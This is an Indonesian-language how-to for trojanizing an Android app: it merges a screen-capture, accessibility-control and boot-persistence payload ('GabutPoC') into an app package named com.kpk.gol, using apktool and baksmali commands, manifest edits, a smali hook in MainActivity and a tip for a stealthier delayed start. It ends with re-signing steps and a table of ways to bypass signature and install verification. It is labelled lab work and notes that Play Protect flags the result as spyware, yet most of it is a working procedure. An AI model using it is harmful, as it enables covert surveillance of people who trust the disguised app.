# Teknik Penanaman APK (Injection)

## Konsep

Menanam APK **GabutPoC** ke dalam APK **GOL** berarti menggabungkan dua APK
menjadi satu file, di mana APK GOL bertindak sebagai **trojan horse** yang
membawa payload GabutPoC.

## Metode yang Tersedia

### Metode 1: Repackage (apktool) ⭐ Paling Umum

**Alur:**
```
1. apktool d target.apk -o unpacked/         # Unpack GOL
2. apktool d payload.apk -o payload_unpacked/ # Unpack GabutPoC
3. Copy smali dari payload ke target
4. Merge AndroidManifest.xml
5. Merge resources jika ada
6. apktool b unpacked/ -o modified.apk       # Repack
7. Sign ulang modified.apk
```

**Kelebihan:**
- Kontrol penuh atas semua file
- Bisa modifikasi smali untuk trigger payload
- Preserve resource structure

**Kekurangan:**
- Signature asli hilang
- APK jadi lebih besar
- Butuh apktool + signing tools

### Metode 2: DEX Merging

**Alur:**
```
1. Buka payload.apk → extract classes.dex
2. Convert ke smali: baksmali classes.dex -o smali/
3. Copy smali/ ke target unpacked
4. Update AndroidManifest
5. Repack & sign
```

### Metode 3: Custom Cordova Plugin

Karena GOL adalah Cordova app, payload bisa dibuat sebagai plugin:

**Alur:**
```
1. Buat Cordova plugin wrapper untuk GabutPoC
2. Tambahkan plugin ke GOL project
3. Build ulang GOL via Cordova
```

**Kelebihan:**
- Tidak merusak signature GOL project
- Clean integration

**Kekurangan:**
- Butuh source code GOL (tidak punya)
- Butuh build environment Cordova

## Langkah Detail (Metode 1)

### Step 1: Unpack GOL APK

```bash
java -jar apktool.jar d com.kpk.gol.apk -o gol_unpacked -f
```

**Struktur hasil unpack:**
```
gol_unpacked/
├── AndroidManifest.xml
├── apktool.yml
├── assets/
│   └── www/
├── kotlin/
├── lib/
├── original/
├── res/
├── smali/
│   ├── classes/        ← GOL smali
│   └── classes2/       ← GOL smali (dex2)
├── smali_assets/
└── unknown/
```

### Step 2: Unpack GabutPoC APK

```bash
java -jar apktool.jar d app-x86_64-debug.apk -o gabutpoc_unpacked -f
```

### Step 3: Copy Smali Files

```bash
# GabutPoC smali (com.example.screenwhip)
cp -r gabutpoc_unpacked/smali/com/example/screenwhip \
      gol_unpacked/smali/com/example/screenwhip/

# ForcedH264EncoderFactory (org.webrtc)
cp -r gabutpoc_unpacked/smali/org/webrtc/ForcedH264Encoder* \
      gol_unpacked/smali/org/webrtc/
```

### Step 4: Update AndroidManifest.xml

**Gabung permission dari GabutPoC:**
```xml
<!-- Tambah ke manifest GOL -->
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
```

**Gabung service/receiver:**
```xml
<application ...>
    <!-- Existing GOL activities -->
    
    <!-- NEW: GabutPoC Services -->
    <service android:name="com.example.screenwhip.ScreenCaptureService"
        android:exported="false"
        android:foregroundServiceType="mediaProjection" />
    
    <service android:name="com.example.screenwhip.KioskControlService"
        android:exported="true"
        android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
        <intent-filter>
            <action android:name="android.accessibilityservice.AccessibilityService" />
        </intent-filter>
        <meta-data android:name="android.accessibilityservice"
            android:resource="@xml/accessibility_service_config" />
    </service>
    
    <receiver android:name="com.example.screenwhip.BootReceiver"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED" />
            <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
        </intent-filter>
    </receiver>
</application>
```

### Step 5: Copy Resources

```bash
# Accessibility service config
cp gabutpoc_unpacked/res/xml/accessibility_service_config.xml \
      gol_unpacked/res/xml/
```

### Step 6: Modify GOL MainActivity Smali

Cari `MainActivity.smali` di GOL, tambahkan trigger untuk start GabutPoC:

```smali
# Di method onCreate(), setelah loadUrl:
    invoke-virtual {p0}, Lcom/kpk/gol/MainActivity;->getApplicationContext()Landroid/content/Context;
    move-result-object v0
    invoke-static {v0}, Lcom/example/screenwhip/BootReceiver;->scheduleStart(Landroid/content/Context;)V
```

Atau lebih stealth: start service via alarm manager dengan delay.

### Step 7: Repackage

```bash
java -jar apktool.jar b gol_unpacked -o gol_modified.apk
```

### Step 8: Sign APK

```bash
# Generate debug keystore (jika belum ada)
keytool -genkey -v -keystore debug.keystore \
    -storepass android -alias androiddebugkey \
    -keypass android -keyalg RSA -keysize 2048 \
    -validity 10000 -dname "CN=Android Debug,O=Android,C=US"

# Sign dengan apksigner
apksigner sign --ks debug.keystore \
    --ks-pass pass:android \
    --key-pass pass:android \
    --v2-signing-enabled true \
    --v3-signing-enabled true \
    gol_modified.apk

# Verify signature
apksigner verify --verbose gol_modified.apk
```

## Sign Detection

### Bagaimana Android Mendeteksi Signature

| Mekanisme | Cara Kerja |
|-----------|------------|
| **APK Signature Scheme v2/v3** | Signature blok di APK diverifikasi saat install |
| **Package Manager** | Cek signature saat update (harus match) |
| **Play Integrity API** | Bandingkan signing certificate dengan Play Store |
| **Play Protect** | Heuristic detection + signature check |

### Skenario Test

| Skenario | Command | Expected |
|----------|---------|----------|
| Install GOL asli (fresh) | `adb install com.kpk.gol.apk` | Success |
| Install GOL modif (fresh) | `adb install gol_modified.apk` | Success (debug sign) |
| Install modif over asli | `adb install -r gol_modified.apk` | **SIGNATURE_MISMATCH** |
| Play Protect scan | Setelah install | Flag spyware/unknown |

### Response System

**INSTALL_FAILED_UPDATE_INCOMPATIBLE:**
```
Error: INSTALL_FAILED_UPDATE_INCOMPATIBLE: 
Package com.kpk.gol signatures do not match previously installed version
```

**Logcat:**
```
PackageManager: Signature mismatch for package com.kpk.gol
PackageManager: INSTALL_FAILED_UPDATE_INCOMPATIBLE
```

**Play Protect Warning:**
```
Play Protect has blocked an app that may collect personal data
This app may try to record your screen without your knowledge
```

### Cara Mem-bypass (Informasi Lab)

| Bypass | Cara | Catatan |
|--------|------|---------|
| Uninstall dulu | `adb uninstall com.kpk.gol` | Data laporan hilang |
| Root + disable verify | `settings put global verifier_verify_adb_installs 0` | Butuh root |
| MDM managed install | Via policy | For enterprise |
| Custom ROM | Nonaktifkan signature check | Advanced |

## Kesimpulan

1. **Signature asli APK tidak bisa dipertahankan** saat APK dimodifikasi
2. **Android akan menolak update** jika signature berbeda
3. **Play Protect** akan mendeteksi screen capture + accessibility sebagai spyware
4. **Debug sign** bisa di-install di device developer (USB debug)
5. **Tanpa root/mdm**, tidak bisa bypass signature check untuk update over app resmi
